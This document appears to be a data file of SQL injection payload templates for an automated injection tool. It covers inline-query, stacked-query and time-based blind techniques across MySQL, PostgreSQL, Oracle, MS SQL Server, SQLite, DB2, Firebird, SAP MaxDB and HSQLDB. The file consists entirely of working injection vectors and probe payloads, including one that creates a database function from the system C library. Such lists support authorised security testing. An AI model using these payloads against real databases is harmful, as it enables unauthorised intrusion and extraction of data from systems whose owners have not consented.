{"title": "Oracle inline queries", "stype": 3, "level": 2, "risk": 1, "clause": [1, 2, 3, 8], "where": [3], "vector": "(SELECT ('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]') FROM DUAL)", "request": {"payload": "(SELECT '[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN TO_NUMBER(1) ELSE TO_NUMBER(0) END)||'[DELIMITER_STOP]' FROM DUAL)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Oracle"}}
{"title": "SQLite inline queries", "stype": 3, "level": 3, "risk": 1, "clause": [1, 2, 3, 8], "where": [3], "vector": "SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'", "request": {"payload": "SELECT '[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)||'[DELIMITER_STOP]'"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "SQLite"}}
{"title": "Firebird inline queries", "stype": 3, "level": 3, "risk": 1, "clause": [1, 2, 3, 8], "where": [3], "vector": "SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' FROM RDB$DATABASE", "request": {"payload": "SELECT '[DELIMITER_START]'||(CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END)||'[DELIMITER_STOP]' FROM RDB$DATABASE"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "Firebird"}}
{"title": "MySQL >= 5.0.12 stacked queries (comment)", "stype": 4, "level": 2, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])", "request": {"payload": ";SELECT SLEEP([SLEEPTIME])", "comment": "#"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 stacked queries", "stype": 4, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])", "request": {"payload": ";SELECT SLEEP([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 stacked queries (query SLEEP - comment)", "stype": 4, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", "request": {"payload": ";(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])", "comment": "#"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 stacked queries (query SLEEP)", "stype": 4, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", "request": {"payload": ";(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL < 5.0.12 stacked queries (heavy query - comment)", "stype": 4, "level": 3, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", "request": {"payload": ";SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))", "comment": "#"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL < 5.0.12 stacked queries (heavy query)", "stype": 4, "level": 5, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", "request": {"payload": ";SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "MySQL"}}
{"title": "PostgreSQL > 8.1 stacked queries (comment)", "stype": 4, "level": 1, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "request": {"payload": ";SELECT PG_SLEEP([SLEEPTIME])", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}
{"title": "PostgreSQL > 8.1 stacked queries", "stype": 4, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "request": {"payload": ";SELECT PG_SLEEP([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}
{"title": "PostgreSQL stacked queries (heavy query - comment)", "stype": 4, "level": 2, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)", "request": {"payload": ";SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL stacked queries (heavy query)", "stype": 4, "level": 5, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)", "request": {"payload": ";SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL < 8.2 stacked queries (Glibc - comment)", "stype": 4, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "request": {"payload": ";CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "PostgreSQL", "dbms_version": "< 8.2", "os": "Linux"}}
{"title": "PostgreSQL < 8.2 stacked queries (Glibc)", "stype": 4, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "request": {"payload": ";CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "PostgreSQL", "dbms_version": "< 8.2", "os": "Linux"}}
{"title": "Microsoft SQL Server/Sybase stacked queries (comment)", "stype": 4, "level": 1, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'", "request": {"payload": ";WAITFOR DELAY '0:0:[SLEEPTIME]'", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)", "stype": 4, "level": 2, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";DECLARE @x CHAR(9);SET @x=0x303a303a3[SLEEPTIME];IF([INFERENCE]) WAITFOR DELAY @x", "request": {"payload": ";DECLARE @x CHAR(9);SET @x=0x303a303a3[SLEEPTIME];WAITFOR DELAY @x", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase stacked queries", "stype": 4, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'", "request": {"payload": ";WAITFOR DELAY '0:0:[SLEEPTIME]'"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase stacked queries (DECLARE)", "stype": 4, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";DECLARE @x CHAR(9);SET @x=0x303a303a3[SLEEPTIME];IF([INFERENCE]) WAITFOR DELAY @x", "request": {"payload": ";DECLARE @x CHAR(9);SET @x=0x303a303a3[SLEEPTIME];WAITFOR DELAY @x"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)", "stype": 4, "level": 1, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END FROM DUAL", "request": {"payload": ";SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)", "stype": 4, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END FROM DUAL", "request": {"payload": ";SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle stacked queries (heavy query - comment)", "stype": 4, "level": 2, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END FROM DUAL", "request": {"payload": ";SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle stacked queries (heavy query)", "stype": 4, "level": 5, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END FROM DUAL", "request": {"payload": ";SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle stacked queries (DBMS_LOCK.SLEEP - comment)", "stype": 4, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END", "request": {"payload": ";BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle stacked queries (DBMS_LOCK.SLEEP)", "stype": 4, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END", "request": {"payload": ";BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle stacked queries (USER_LOCK.SLEEP - comment)", "stype": 4, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END", "request": {"payload": ";BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle stacked queries (USER_LOCK.SLEEP)", "stype": 4, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END", "request": {"payload": ";BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "IBM DB2 stacked queries (heavy query - comment)", "stype": 5, "level": 3, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE])", "request": {"payload": ";SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "IBM DB2"}}
{"title": "IBM DB2 stacked queries (heavy query)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE])", "request": {"payload": ";SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "IBM DB2"}}
{"title": "SQLite > 2.0 stacked queries (heavy query - comment)", "stype": 4, "level": 3, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", "request": {"payload": ";SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SQLite", "dbms_version": "> 2.0"}}
{"title": "SQLite > 2.0 stacked queries (heavy query)", "stype": 4, "level": 5, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", "request": {"payload": ";SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SQLite", "dbms_version": "> 2.0"}}
{"title": "Firebird stacked queries (heavy query - comment)", "stype": 4, "level": 4, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM]) FROM RDB$DATABASE", "request": {"payload": ";SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Firebird", "dbms_version": ">= 2.0"}}
{"title": "Firebird stacked queries (heavy query)", "stype": 4, "level": 5, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM]) FROM RDB$DATABASE", "request": {"payload": ";SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Firebird", "dbms_version": ">= 2.0"}}
{"title": "SAP MaxDB stacked queries (heavy query - comment)", "stype": 5, "level": 4, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3", "request": {"payload": ";SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SAP MaxDB"}}
{"title": "SAP MaxDB stacked queries (heavy query)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3", "request": {"payload": ";SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SAP MaxDB"}}
{"title": "HSQLDB >= 1.7.2 stacked queries (heavy query - comment)", "stype": 4, "level": 4, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) END", "request": {"payload": ";CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}
{"title": "HSQLDB >= 1.7.2 stacked queries (heavy query)", "stype": 4, "level": 5, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) END", "request": {"payload": ";CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}
{"title": "HSQLDB >= 2.0 stacked queries (heavy query - comment)", "stype": 4, "level": 4, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) END", "request": {"payload": ";CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "HSQLDB", "dbms_version": ">= 2.0"}}
{"title": "HSQLDB >= 2.0 stacked queries (heavy query)", "stype": 4, "level": 5, "risk": 2, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) END", "request": {"payload": ";CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "HSQLDB", "dbms_version": ">= 2.0"}}
{"title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)", "stype": 5, "level": 1, "risk": 1, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", "request": {"payload": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 OR time-based blind (query SLEEP)", "stype": 5, "level": 1, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", "request": {"payload": "OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 AND time-based blind (SLEEP)", "stype": 5, "level": 2, "risk": 1, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])", "request": {"payload": "AND SLEEP([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 OR time-based blind (SLEEP)", "stype": 5, "level": 2, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])", "request": {"payload": "OR SLEEP([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)", "stype": 5, "level": 3, "risk": 1, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])", "request": {"payload": "AND SLEEP([SLEEPTIME])", "comment": "#"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)", "stype": 5, "level": 3, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])", "request": {"payload": "OR SLEEP([SLEEPTIME])", "comment": "#"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)", "stype": 5, "level": 3, "risk": 1, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", "request": {"payload": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])", "comment": "#"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)", "stype": 5, "level": 3, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", "request": {"payload": "OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])", "comment": "#"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL < 5.0.12 AND time-based blind (heavy query)", "stype": 5, "level": 2, "risk": 2, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", "request": {"payload": "AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "MySQL", "dbms_version": "< 5.0.12"}}
{"title": "MySQL < 5.0.12 OR time-based blind (heavy query)", "stype": 5, "level": 2, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", "request": {"payload": "OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "MySQL", "dbms_version": "< 5.0.12"}}
{"title": "MySQL < 5.0.12 AND time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", "request": {"payload": "AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))", "comment": "#"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "MySQL", "dbms_version": "< 5.0.12"}}
{"title": "MySQL < 5.0.12 OR time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])", "request": {"payload": "OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))", "comment": "#"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "MySQL", "dbms_version": "< 5.0.12"}}
{"title": "MySQL >= 5.0.12 RLIKE time-based blind", "stype": 5, "level": 2, "risk": 1, "clause": [1, 2, 3, 9], "where": [1], "vector": "RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))", "request": {"payload": "RLIKE SLEEP([SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 RLIKE time-based blind (comment)", "stype": 5, "level": 4, "risk": 1, "clause": [1, 2, 3, 9], "where": [1], "vector": "RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))", "request": {"payload": "RLIKE SLEEP([SLEEPTIME])", "comment": "#"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)", "stype": 5, "level": 3, "risk": 1, "clause": [1, 2, 3, 9], "where": [1], "vector": "RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", "request": {"payload": "RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
